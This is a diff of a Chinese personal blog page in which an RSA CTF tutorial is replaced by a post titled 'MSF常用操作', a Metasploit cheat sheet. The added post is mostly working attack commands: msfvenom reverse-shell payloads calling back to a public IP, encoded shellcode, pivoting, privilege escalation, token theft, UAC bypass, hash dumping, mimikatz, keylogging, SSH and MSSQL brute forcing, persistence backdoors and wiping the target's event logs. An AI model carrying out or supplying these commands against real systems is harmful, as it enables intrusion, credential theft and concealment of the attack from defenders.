@@ -15,7 +15,7 @@
     <meta name="description" content="">
     <meta name="Cache-Control" content="no-cache">
     <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1"/>
-    <title>Crypto_RSA算法总结 · Ywc&#39;s blog</title>
+    <title>MSF常用操作 · Ywc&#39;s blog</title>
     <style type="text/css">
     @font-face {
         font-family: 'Oswald-Regular';
@@ -210,7 +210,7 @@
                 <a href="/" >Ywc&#39;s blog</a>
             </div>
             <div class="post-title">
-                <a href="#" class="post-name">Crypto_RSA算法总结</a>
+                <a href="#" class="post-name">MSF常用操作</a>
             </div>
     </div>
     
@@ -242,7 +242,7 @@ height:50vh;
         <h1 class="intro-title">
             <!-- 主页  -->
             
-            Crypto_RSA算法总结
+            MSF常用操作
             <!-- 404 -->
             
         </h1>
@@ -259,14 +259,20 @@ height:50vh;
             <div class="post-intros">
                 <!-- 文章页标签  -->
                 
+                    <div class= post-intro-tags >
+    
+        <a class="post-tag" href="javascript:void(0);" data-tags = "learn">learn</a>
+    
+</div>
+                
                 
                     <div class="post-intro-read">
-                        <span>Word count: <span class="post-count">1,525</span> / Reading time: <span class="post-count">6 min</span></span>
+                        <span>Word count: <span class="post-count">1,184</span> / Reading time: <span class="post-count">5 min</span></span>
                     </div>
                 
                 <div class="post-intro-meta">
                     <span class="post-intro-calander iconfont-archer">&#xe676;</span>
-                    <span class="post-intro-time">2018/05/18</span>
+                    <span class="post-intro-time">2019/03/18</span>
                     
                     <span id="busuanzi_container_page_pv" class="busuanzi-pv">
                         <span class="iconfont-archer">&#xe602;</span>
@@ -390,87 +396,44 @@ height:50vh;
         <div class="container container-unloaded">
             <main class="main post-page">
     <article class="article-entry">
-        <p>最近比赛过多，没来得及总结，web已经很难突破了，学一波Crypto吧。<br><img src="/2018/05/18/rsa/1.png" alt="rsa"></p>
-<p>个人做题总结：<br>1.当e过大时，用Wiener attack</p>
-<h2 id="RSA算法简介："><a href="#RSA算法简介：" class="headerlink" title="RSA算法简介："></a>RSA算法简介：</h2><p>RSA算法涉及三个参数，n，e，d，私钥为（n，d），公钥为（n，e）。</p>
-<p>其中n是两个大素数p，q的乘积(n=p*q)。c为密文，m为明文。</p>
-<p>d和e互为模反元素，φ(n)是n的欧拉函数(φ(n)= φ(p×q)=φ(p)φ(q)=(p-1)(q-1))。<br>φ = (p−1) <em> (q−1) 即n的欧拉函数，然后选择一个e (1&lt;e&lt;φ)，且e和φ互质<br>取e的模反数为d，计算方法:</em>e <em> d ≡ 1 (mod φ)</em></p>
-<p>对明文m进行加密：<em>c = pow(m, e, N)</em>，得到的c即为密文</p>
-<p>对密文c进行解密，<em>m = pow(c, d, N)</em>，得到的m即为明文</p>
-<p>加密：c=m^e mod n</p>
-<p>解密：m=c^d mod n</p>
-<p>总结：</p>
-<pre><code>p 和 q ：大整数N的两个因子（factor）
-
-n：大整数n，我们称之为模数（modulus)
-
-e 和 d：互为模反数的两个指数（exponent）
-
-c 和 m：分别是密文和明文，这里一般指的是一个十进制的数。
-</code></pre><h2 id="CTF中的RSA题型"><a href="#CTF中的RSA题型" class="headerlink" title="CTF中的RSA题型"></a>CTF中的RSA题型</h2><p>CTF中的RSA题目一般是将flag进行加密，然后把密文（即c）和其他一些你解题需要的信息一起给你，你需要克服重重难关，去解密密文c，得到flag（即m），一般有下列题型。</p>
-<font color="blue">公钥加密文</font><br>这是CTF中最常见最基础的题型，出题人会给你一个公钥文件（通常是以.pem或.pub结尾的文件）和密文（通常叫做flag.enc之类的），你需要分析公钥，提取出（N，e），通过各种攻击手段恢复私钥，然后去解密密文得到flag。<br><br><font color="blue">文本文档</font><br>对于第一种题型，耿直点的出题人直接给你一个txt文本文档，里面直接写出了（N，e，c）所对应的十进制数值，然后你直接拿去用就行了。当然也不都是给出（N，e，c）的值，有时还会给出其他一些参数，这时就需要思考，这题具体考察的什么攻击方法<br><br><font color="blue">pcap文件</font>
-
-<p>有时出题人会给你一个流量包，你需要用wireshark等工具分析，然后根据流量包的通信信息，分析题目考察的攻击方法，你可以提取出所有你解题需要用到的参数，然后进行解密</p>
-<font color="blue">本地脚本分析</font>
-
-<p>题目会给你一个脚本和一段密文，一般为python编写，你需要逆向文件流程，分析脚本的加密过程，写出对应的解密脚本进行解密</p>
-<font color="blue">远程脚本利用</font>
-
-<p>这种题型一般难度较大。题目会给你一个运行在远程服务器上的python脚本和服务器地址，你需要分析脚本存在的漏洞，确定攻击算法，然后编写脚本与服务器交互，得到flag.</p>
-<h2 id="RSA的常见攻击方法"><a href="#RSA的常见攻击方法" class="headerlink" title="RSA的常见攻击方法"></a>RSA的常见攻击方法</h2><font color="blue">当模数N过小时</font>
-
-<p>RSA的非对称体制是建立在大整数分解难题上的，所以最基本的攻击方法就是当模数N过小时，我们可以写个脚本直接爆破他的因子，如<br>    N = 1211809</p>
-<pre><code>for i in range(2, N):
-
-    if N % i == 0:
-
-        print i
-</code></pre><p>在CTF中出现的不会太小，一般是不可能爆破分解的，都是要用到一些攻击算法的。</p>
-<font color="blue">分解大整数的一些算法</font>
-
-<p><strong>Wiener’s attack</strong></p>
-<p><a href="https://en.wikipedia.org/wiki/Wiener%27s_attack" target="_blank" rel="noopener">https://en.wikipedia.org/wiki/Wiener%27s_attack</a></p>
-<p>使用:当d &lt; (1/3) N^(1/4)时</p>
-<p><strong>费马分解</strong></p>
-<p>当大整数N的两个因子p和q相近时</p>
-<p><strong>Small q</strong></p>
-<p>当q较小时，即|p-q|较大时，我们可以直接爆破因子</p>
-<p><strong>Boneh Durfee Method</strong></p>
-<p>当d满足 d ≤ N^0.292 时，我们可以利用该方法分解N，理论上比wiener attack要强一些。</p>
-<p><strong>yafu</strong></p>
-<p>yafu使用最强大的现代算法去自动化的分解输入的整数。大多数的算法都实现了多线程，让yafu能充分利用多核处理器（算法包括 SNFS, GNFS, SIQS, 和 ECM）。</p>
-<p><strong>factordb</strong></p>
-<p>如果对一个大整数用一些特殊算法也分解不了的时候，我们可以在 <a href="http://factordb.com/" target="_blank" rel="noopener">http://factordb.com/</a> 中查询一下数据库，说不定就能找到其因子</p>
-<font color="blue">其他一些题型</font>
-
-<p>有些题会给你一些随机生成的大整数，一般来说是无法直接分解的，不过一般会给我们其他切入点</p>
-<p><strong>Rabin算法</strong></p>
-<p>当e等于2时</p>
-<p><strong>小公钥指数攻击</strong></p>
-<p>当e十分小时，比如e等于3时</p>
-<p><strong>d泄露攻击</strong></p>
-<p>如果我们知道一组过期的（N，e1，d1）和一组由新的e2组成的公钥及其加密的密文（N，e2，c），我们可以由（e1，d1）得到模数N的两个因子p和q，再去算e2的模反数d2，去解密密文</p>
-<p><strong>共模攻击</strong></p>
-<p>使用相同的模数 N 、不同的私钥，加密同一明文消息</p>
-<p><strong>模不互素</strong></p>
-<p>两个公钥的N不互素时</p>
-<p><strong>Known High Bits Factor Attack</strong></p>
-<p>我们知道模数N其中一个因子的高比特位时</p>
-<p><strong>Stereotyped messages</strong></p>
-<p>如果你知道明文中最重要的部分，您可以使用此方法找到消息的其余部分。</p>
-<p><strong>Basic Broadcast Attack</strong></p>
-<p>同一个加密指数e和不同且互素的模数N加密了同一个密文，并发送给了其他e个用户</p>
-<h2 id="CTF中RSA的一些题目"><a href="#CTF中RSA的一些题目" class="headerlink" title="CTF中RSA的一些题目"></a>CTF中RSA的一些题目</h2><h3 id="在一次RSA密钥对生成中，假设p-473398607161，q-4511491，e-17，求d"><a href="#在一次RSA密钥对生成中，假设p-473398607161，q-4511491，e-17，求d" class="headerlink" title="在一次RSA密钥对生成中，假设p=473398607161，q=4511491，e=17，求d"></a>在一次RSA密钥对生成中，假设p=473398607161，q=4511491，e=17，求d</h3><p><a href="http://www.shiyanbar.com/ctf/1828" target="_blank" rel="noopener">http://www.shiyanbar.com/ctf/1828</a><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"># coding=utf-8</span><br><span class="line">import gmpy2</span><br><span class="line"></span><br><span class="line">p = 473398607161</span><br><span class="line">q = 4511491</span><br><span class="line">e = 17</span><br><span class="line"></span><br><span class="line">phi = (p - 1) * (q - 1)</span><br><span class="line"># 计算得到私钥（n, d）</span><br><span class="line">d = long(gmpy2.invert(e, phi))</span><br><span class="line">print d</span><br></pre></td></tr></table></figure></p>
-<h3 id="c-是密文-已知-p、q、e-求明文"><a href="#c-是密文-已知-p、q、e-求明文" class="headerlink" title="c 是密文 已知 p、q、e 求明文."></a>c 是密文 已知 p、q、e 求明文.</h3><p><a href="http://www.shiyanbar.com/ctf/1979" target="_blank" rel="noopener">http://www.shiyanbar.com/ctf/1979</a></p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">import gmpy2</span><br><span class="line"></span><br><span class="line">p = 9648423029010515676590551740010426534945737639235739800643989352039852507298491399561035009163427050370107570733633350911691280297777160200625281665378483L</span><br><span class="line"></span><br><span class="line">q = 11874843837980297032092405848653656852760910154543380907650040190704283358909208578251063047732443992230647903887510065547947313543299303261986053486569407L</span><br><span class="line"></span><br><span class="line">e = 65537L</span><br><span class="line"></span><br><span class="line">c= 83208298995174604174773590298203639360540024871256126892889661345742403314929861939100492666605647316646576486526217457006376842280869728581726746401583705899941768214138742259689334840735633553053887641847651173776251820293087212885670180367406807406765923638973161375817392737747832762751690104423869019034L</span><br><span class="line"></span><br><span class="line">phi = (p - 1) * (q - 1)</span><br><span class="line"></span><br><span class="line"># 计算得到私钥（n, d）</span><br><span class="line"></span><br><span class="line">d = long(gmpy2.invert(e, phi))</span><br><span class="line"></span><br><span class="line">n = p * q</span><br><span class="line"></span><br><span class="line"># 计算并输出c^d mod n</span><br><span class="line"></span><br><span class="line">print pow(c, d, n)</span><br></pre></td></tr></table></figure>
+        <h2 id="payload的几个常用生成"><a href="#payload的几个常用生成" class="headerlink" title="payload的几个常用生成"></a>payload的几个常用生成</h2><p>1、生成windows下的反弹木马<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/meterpreter/reverse_tcp LHOST=60.205.212.140 LPORT=8888 -f exe &gt; 8888.exe</span><br><span class="line">-p=payload -f format -o path</span><br></pre></td></tr></table></figure></p>
+<p>2、监听<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">use exploit/multi/handler</span><br><span class="line">set PAYLOAD windows/meterpreter/reverse_tcp</span><br><span class="line">set LHOST 192.168.195.130</span><br><span class="line">set LPORT 2333</span><br><span class="line">exploit(攻击)</span><br></pre></td></tr></table></figure></p>
+<p>3、PHP<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p php/meterpreter_reverse_tcp LHOST=60.205.212.140 LPORT=8888 -f raw &gt; shell.php</span><br><span class="line">use exploit/multi/handler</span><br><span class="line">set PAYLOAD php/meterpreter_reverse_tcp</span><br><span class="line">set LHOST 172.17.150.246</span><br><span class="line">set LPORT 8888</span><br><span class="line">exploit</span><br></pre></td></tr></table></figure></p>
+<p>4、shellcode<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/meterpreter/reverse_tcp LPORT=1234 LHOST=60.205.212.140 -e x86/shikata_ga_nai -i 11 -f py &gt; 1.py  //-e 使用编码 -i 编码次数</span><br></pre></td></tr></table></figure></p>
+<h2 id="内网代理"><a href="#内网代理" class="headerlink" title="内网代理"></a>内网代理</h2><p>首先需要连接到你get到的sessions,在此基础下添加路由</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; run get_local_subnets //获取网段</span><br><span class="line">meterpreter &gt; run autoroute -s 172.2.175.0/24 //添加路由</span><br><span class="line">meterpreter &gt; run autoroute -p //查看路由</span><br><span class="line">meterpreter &gt; run autoroute -d -s 172.2.175.0 //删除网段</span><br><span class="line">meterpreter &gt; run post/windows/gather/arp_scanner RHOSTS=7.7.7.0/24 //探测该网段下的存活主机。</span><br><span class="line">meterpreter &gt; background //后台sessions</span><br></pre></td></tr></table></figure>
+<h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p>1、getsystem</p>
+<p><code>meterpreter &gt; getsystem</code> //直getsystem提权，最常用简单的办法</p>
+<p>2、使用exp提权<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; background //先后台运行会话</span><br><span class="line">[*] Backgrounding session 1…</span><br><span class="line">msf &gt; use post/windows/escalate/ms10_073_kbdlayout</span><br><span class="line">msf &gt; show options</span><br><span class="line">msf &gt; set session 1 //设置要使用的会话</span><br><span class="line">msf post(ms10_073_kbdlayout) &gt; exploit</span><br><span class="line">注意：如果创建了一个system进程，就可以立马sessions 1进入会话，然后ps查看进程，使用migrate pid注入到进程。</span><br><span class="line">或者直接：</span><br><span class="line">meterpreter &gt; run post/windows/escalate/ms10_073_kbdlayout</span><br></pre></td></tr></table></figure></p>
+<p>3、盗取令牌<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; use incognito //进入这个模块</span><br><span class="line">meterpreter &gt; list_tokens –u //查看存在的令牌</span><br><span class="line">meterpreter &gt; impersonate_token NT AUTXXXX\SYSTEM //令牌是DelegationTokens一列，getuid查看，两个斜杠</span><br></pre></td></tr></table></figure></p>
+<p>注：只有具有“模仿安全令牌权限”的账户才能去模仿别人的令牌，一般大多数的服务型账户（IIS、MSSQL等）有这个权限，大多数用户级的账户没有这个权限。一般从web拿到的webshell都是IIS服务器权限，是具有这个模仿权限的，建好的账户没有这个权限。使用菜刀（IIS服务器权限）反弹meterpreter是服务型权限。</p>
+<p>4、Bypassuac<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">msf &gt; use exploit/windows/local/bypassuac //32位与64位一样，其他几个模块也一样</span><br><span class="line">msf &gt; show options</span><br><span class="line">msf &gt; set session 4</span><br><span class="line">msf &gt; run //成功后会返回一个新的session，进入新会话，发现权限没变，使用getsystem即可完成提权</span><br></pre></td></tr></table></figure></p>
+<p>5、Hash<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; run post/windows/gather/smart_hashdump //读取hash这种做法最智能，效果最好。</span><br></pre></td></tr></table></figure></p>
+<h2 id="建立持久后门"><a href="#建立持久后门" class="headerlink" title="建立持久后门"></a>建立持久后门</h2><p>1、服务启动后门<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; run metsvc -A //再开起一个终端，进入msfconsole</span><br><span class="line">msf &gt; use exploit/multi/handler //新终端中监听</span><br><span class="line">msf &gt; set payload windows/metsvc_bind_tcp</span><br><span class="line">msf &gt; set LPORT 31337</span><br><span class="line">msf &gt; set RHOST 192.168.0.128</span><br><span class="line">msf &gt; run //获取到的会话是system权限</span><br></pre></td></tr></table></figure></p>
+<p>2、启动项启动后门<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; run persistence -X -i 10 -p 6666 -r 192.168.71.105</span><br><span class="line">// -X 系统开机自启，-i 10 10秒重连一次，-p 监听端口，-r 监听机。直接监听就好了，他自己会链接回来。</span><br><span class="line">注意到移除 persistence 后门的办法是删除 HKLM\Software\Microsoft\Windows\CurrentVersion\Run\ 中的注册表键和 C:\WINDOWS\TEMP\ 中的 VBScript 文件。</span><br><span class="line">缺点：容易被杀毒软件杀</span><br><span class="line">注意:这两个后门有个弊端，在进程中都会存在服务名称为meterpreter的进程。</span><br></pre></td></tr></table></figure></p>
+<h2 id="漏洞扫描"><a href="#漏洞扫描" class="headerlink" title="漏洞扫描"></a>漏洞扫描</h2><h3 id="1、对端口都扫描"><a href="#1、对端口都扫描" class="headerlink" title="1、对端口都扫描"></a>1、对端口都扫描</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">use auxiliary/scanner/portscan/tcp</span><br><span class="line">show options</span><br><span class="line">set rhosts 192.168.2.1-255</span><br><span class="line">set ports 21,22,25,443,445,1433,3306</span><br><span class="line">set threads 20</span><br><span class="line">exploit</span><br></pre></td></tr></table></figure>
+<h3 id="2、mssql开发利用"><a href="#2、mssql开发利用" class="headerlink" title="2、mssql开发利用"></a>2、mssql开发利用</h3><p>2-1:对各个ip是否有mssql服务的探测<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">use scanner/mssql/mssql_ping //测试MSSQL的存在和信息</span><br><span class="line">show options</span><br><span class="line">set rhosts 192.168.2.1-255</span><br><span class="line">set threads 30</span><br><span class="line">exploit</span><br></pre></td></tr></table></figure></p>
+<p>2-2：对扫描到的ip进行爆破<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">use scanner/mssql/mssql_login    //具体配置show options</span><br></pre></td></tr></table></figure></p>
+<p>2-3：sa权限对其利用<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">use admin/mssql/mssql_exec</span><br><span class="line">set rhost 192.168.2.10</span><br><span class="line">set password sa</span><br><span class="line">set CMD cmd.exe /c echo hello</span><br><span class="line">exploit</span><br></pre></td></tr></table></figure></p>
+<h3 id="3、爆破ssh模块"><a href="#3、爆破ssh模块" class="headerlink" title="3、爆破ssh模块"></a>3、爆破ssh模块</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">use auxiliary/scanner/ssh/ssh_login</span><br><span class="line">set rhosts 7.7.7.20</span><br><span class="line">set username root</span><br><span class="line">set pass_file /root/pass.txt //加载字典，可以收集密码做字典</span><br><span class="line">set threads 50</span><br><span class="line">run</span><br></pre></td></tr></table></figure>
+<h3 id="4、通过nmap扫描基本漏洞"><a href="#4、通过nmap扫描基本漏洞" class="headerlink" title="4、通过nmap扫描基本漏洞"></a>4、通过nmap扫描基本漏洞</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">msf &gt; nmap  --script=vuln 受害靶机ip地址</span><br><span class="line">msf &gt; nmap  --script=mysql-info 192.168.0.4 //扫描mysql数据库信息 版本 等.</span><br></pre></td></tr></table></figure>
+<h3 id="5、最后清除记录"><a href="#5、最后清除记录" class="headerlink" title="5、最后清除记录"></a>5、最后清除记录</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msf &gt; clearev   //删除目标机上的应用程序、系统和安全日志。</span><br></pre></td></tr></table></figure>
+<h2 id="一些常用命令"><a href="#一些常用命令" class="headerlink" title="一些常用命令"></a>一些常用命令</h2><p>查看系统命令 <code>sysinfo</code></p>
+<p>截图 <code>screenshot</code></p>
+<p>查看是否是虚拟机 <code>run checkvm</code></p>
+<p>查看运行木马的用户 <code>getuid</code></p>
+<p>注入到进程 <code>migrate pid</code> //成功会提示successfully</p>
+<p>加载mimikatz模块 <code>meterpreter &gt; load mimikatz meterpreter &gt; wdigest</code> //需要system权限</p>
+<p>获取键盘记录：<code>meterpreter&gt; run post/windows/capture/keylog_recorder</code> #运行键盘记录模块</p>
+<p>进入<code>session:sessions -i</code></p>
 
     </article>
     <!-- license  -->
     
         <div class="license-wrapper">
             <p>原文作者: <a href="https://yinwc.github.io">Ywc</a>
-            <p>原文链接: <a href="https://yinwc.github.io/2018/05/18/rsa/">https://yinwc.github.io/2018/05/18/rsa/</a>
-            <p>发表日期: <a href="https://yinwc.github.io/2018/05/18/rsa/">May 18th 2018, 4:33:57 pm</a>
+            <p>原文链接: <a href="https://yinwc.github.io/2019/03/18/msf常用操作/">https://yinwc.github.io/2019/03/18/msf常用操作/</a>
+            <p>发表日期: <a href="https://yinwc.github.io/2019/03/18/msf常用操作/">March 18th 2019, 11:23:22 am</a>
             <p>版权声明: </p>
         </div>
     
@@ -479,16 +442,16 @@ c 和 m：分别是密文和明文，这里一般指的是一个十进制的数�
         <li class="next">
             
                 <div class="nextSlogan">Next Post</div>
-                <a href= "/2018/05/28/python/" title= 学习python中遇到的问题及总结 >
-                    <div class="nextTitle">学习python中遇到的问题及总结</div>
+                <a href= "/2019/03/26/反向代理/" title= 反向代理 >
+                    <div class="nextTitle">反向代理</div>
                 </a>
             
         </li>
         <li class="previous">
             
                 <div class="prevSlogan">Previous Post</div>
-                <a href= "/2018/05/16/problem/" title= 日常学习中问题 >
-                    <div class="prevTitle">日常学习中问题</div>
+                <a href= "/2019/03/07/反弹shell/" title= Linux下反弹shell的方法 >
+                    <div class="prevTitle">Linux下反弹shell的方法</div>
                 </a>
             
         </li>
@@ -600,7 +563,7 @@ top:50vh;
         <div class="toc-catalog">
             <span class="iconfont-archer catalog-icon">&#xe613;</span><span>CATALOG</span>
         </div>
-        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#RSA算法简介："><span class="toc-number">1.</span> <span class="toc-text">RSA算法简介：</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#CTF中的RSA题型"><span class="toc-number">2.</span> <span class="toc-text">CTF中的RSA题型</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#RSA的常见攻击方法"><span class="toc-number">3.</span> <span class="toc-text">RSA的常见攻击方法</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#CTF中RSA的一些题目"><span class="toc-number">4.</span> <span class="toc-text">CTF中RSA的一些题目</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#在一次RSA密钥对生成中，假设p-473398607161，q-4511491，e-17，求d"><span class="toc-number">4.1.</span> <span class="toc-text">在一次RSA密钥对生成中，假设p=473398607161，q=4511491，e=17，求d</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#c-是密文-已知-p、q、e-求明文"><span class="toc-number">4.2.</span> <span class="toc-text">c 是密文 已知 p、q、e 求明文.</span></a></li></ol></li></ol>
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#payload的几个常用生成"><span class="toc-number">1.</span> <span class="toc-text">payload的几个常用生成</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#内网代理"><span class="toc-number">2.</span> <span class="toc-text">内网代理</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#提权"><span class="toc-number">3.</span> <span class="toc-text">提权</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#建立持久后门"><span class="toc-number">4.</span> <span class="toc-text">建立持久后门</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#漏洞扫描"><span class="toc-number">5.</span> <span class="toc-text">漏洞扫描</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1、对端口都扫描"><span class="toc-number">5.1.</span> <span class="toc-text">1、对端口都扫描</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2、mssql开发利用"><span class="toc-number">5.2.</span> <span class="toc-text">2、mssql开发利用</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3、爆破ssh模块"><span class="toc-number">5.3.</span> <span class="toc-text">3、爆破ssh模块</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4、通过nmap扫描基本漏洞"><span class="toc-number">5.4.</span> <span class="toc-text">4、通过nmap扫描基本漏洞</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#5、最后清除记录"><span class="toc-number">5.5.</span> <span class="toc-text">5、最后清除记录</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#一些常用命令"><span class="toc-number">6.</span> <span class="toc-text">一些常用命令</span></a></li></ol>
     </div>
     
     <div class="back-top iconfont-archer">&#xe639;</div>
